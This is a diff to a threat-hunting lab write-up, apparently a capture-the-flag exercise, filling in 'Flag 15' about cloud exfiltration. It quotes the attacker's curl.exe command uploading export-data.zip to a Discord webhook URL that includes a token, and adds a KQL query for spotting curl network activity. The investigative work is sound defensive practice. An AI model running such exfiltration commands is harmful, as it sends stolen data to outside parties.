@@ -253,12 +253,19 @@ DeviceFileEvents
 
 ##  Flag 15 – Identify the cloud service used to exfiltrate stolen data
 
-**Objective**: 
+**Finding**: The attacker used `curl.exe` to upload the file `export-data.zip` to `https[:]//discord[.]com` at `2025-11-19T19:09:21.4234133Z`  
 
-**Finding**:  
+**Command Used**:  `curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https[:]//discord[.]com/api/webhooks/1432247266151891004/Exd_b9386RVgXOgYSMFHpmvP22jpRJrMNaBqymQy8fh98gcsD6Yamn6EIf_kpdpq83_8`  
+
+**Thoughts**: curl.exe is an easy way to upload or download files to and from the internet, so my first thought was to query for network activity initiated by the curl command.
 
 **KQL Query**:
 ```
+DeviceNetworkEvents
+| where DeviceName == "azuki-sl"
+| where RemotePort == "443"
+| where InitiatingProcessCommandLine contains "curl"
+
 ```
 
 **Notes:**
